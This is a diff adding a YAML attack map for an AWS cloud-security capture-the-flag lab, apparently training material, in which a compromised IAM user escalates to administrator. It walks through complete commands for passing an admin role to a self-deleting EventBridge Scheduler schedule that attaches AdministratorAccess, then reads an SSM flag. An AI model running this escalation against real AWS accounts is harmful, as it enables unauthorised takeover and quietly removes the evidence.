@@ -1,0 +1,120 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-scheduler-001-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole on the scheduler admin role plus
+        scheduler:CreateSchedule — enough to create a one-shot EventBridge Scheduler
+        schedule whose universal target invokes iam:AttachUserPolicy directly as the
+        passed admin role, with no Lambda function, container, or EC2 instance required.
+
+    - id: scheduler-role
+      label: "Scheduler Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-scheduler-001-to-admin-scheduler-role"
+      description: >
+        This IAM role has AdministratorAccess and trusts scheduler.amazonaws.com. It is
+        passed as the execution role when creating the EventBridge Scheduler schedule.
+        When the schedule fires, EventBridge Scheduler assumes this role and uses its
+        credentials to invoke the AWS SDK action specified in the universal target ARN —
+        in this case iam:AttachUserPolicy, which grants the starting user full
+        administrative access.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/scheduler-001-to-admin"
+      description: >
+        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
+        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
+        granted implicitly by AdministratorAccess). Your goal is to read this parameter
+        using the admin access gained from the previous step.
+
+  edges:
+    - from: starting-user
+      to: scheduler-role
+      label: "iam:PassRole + scheduler:CreateSchedule"
+      description: >
+        The starting user creates a one-shot EventBridge Scheduler schedule, passing the
+        admin role as the execution role via iam:PassRole. The schedule's Target.Arn is
+        set to the universal target arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy —
+        a special ARN prefix that lets Scheduler invoke any AWS SDK action directly.
+        The Target.Input JSON carries the parameters for the iam:AttachUserPolicy call:
+        the starting user's name and the AdministratorAccess policy ARN. When the
+        at() expression fires (90 seconds after creation), EventBridge Scheduler assumes
+        the passed admin role and calls iam:AttachUserPolicy on its behalf. The schedule
+        is created with --action-after-completion DELETE so it removes itself afterwards.
+        After waiting approximately 120 seconds for the schedule to fire and IAM
+        propagation to complete, the starting user has AdministratorAccess.
+      hints:
+        - "Compute a UTC timestamp 90 seconds from now and use it in an at() schedule expression. Build the Target JSON with Arn set to arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy, RoleArn set to the scheduler admin role (iam:PassRole authorizes this), and Input as a JSON string containing UserName and PolicyArn (arn:aws:iam::aws:policy/AdministratorAccess)."
+        - "The Input field must be a JSON-encoded string, not a nested object — serialize it first (e.g., with jq -cn). Pass --action-after-completion DELETE so the schedule self-deletes after firing. Wait 120 seconds after creation for the schedule to execute and IAM propagation to complete before verifying."
+        - "Browse to https://pathfinding.cloud/paths/scheduler-001 for full technique details."
+      commands:
+        - description: "Check your current identity"
+          command: "aws sts get-caller-identity"
+        - description: "Compute a schedule time 90 seconds from now (UTC)"
+          command: >
+            SCHEDULE_TIME=$(python3 -c "
+            from datetime import datetime, timedelta, timezone
+            t = datetime.now(timezone.utc) + timedelta(seconds=90)
+            print(t.strftime('%Y-%m-%dT%H:%M:%S'))
+            ")
+        - description: "Build the Input JSON (must be a serialized string, not a nested object)"
+          command: >
+            SCHEDULE_INPUT=$(jq -cn
+            --arg user "pl-prod-scheduler-001-to-admin-starting-user"
+            --arg policy "arn:aws:iam::aws:policy/AdministratorAccess"
+            '{UserName: $user, PolicyArn: $policy}')
+        - description: "Build the full Target JSON"
+          command: >
+            TARGET_JSON=$(jq -cn
+            --arg arn "arn:aws:scheduler:::aws-sdk:iam:attachUserPolicy"
+            --arg role "arn:aws:iam::{account_id}:role/pl-prod-scheduler-001-to-admin-scheduler-role"
+            --arg input "$SCHEDULE_INPUT"
+            '{Arn: $arn, RoleArn: $role, Input: $input}')
+        - description: "Create the one-shot schedule targeting the universal target"
+          command: >
+            aws scheduler create-schedule
+            --name pl-prod-scheduler-001-to-admin-privesc
+            --schedule-expression "at($SCHEDULE_TIME)"
+            --flexible-time-window '{"Mode": "OFF"}'
+            --target "$TARGET_JSON"
+            --action-after-completion DELETE
+        - description: "Wait 120 seconds for the schedule to fire and IAM to propagate"
+          command: "sleep 120"
+        - description: "Verify AdministratorAccess was attached to the starting user"
+          command: "aws iam list-attached-user-policies --user-name pl-prod-scheduler-001-to-admin-starting-user"
+
+    - from: scheduler-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        With AdministratorAccess now attached to the starting user by the Scheduler
+        execution, retrieve the scenario flag from SSM Parameter Store using the same
+        starting user credentials. AdministratorAccess grants ssm:GetParameter on all
+        parameters in the account, so no additional permissions or credential rotation
+        is needed — the existing access key now has full admin access.
+      hints:
+        - "You now hold admin-equivalent credentials on the starting user. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
+        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
+        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+      commands:
+        - description: "Retrieve the CTF flag from SSM Parameter Store"
+          command: "aws ssm get-parameter --name /pathfinding-labs/flags/scheduler-001-to-admin --query 'Parameter.Value' --output text"
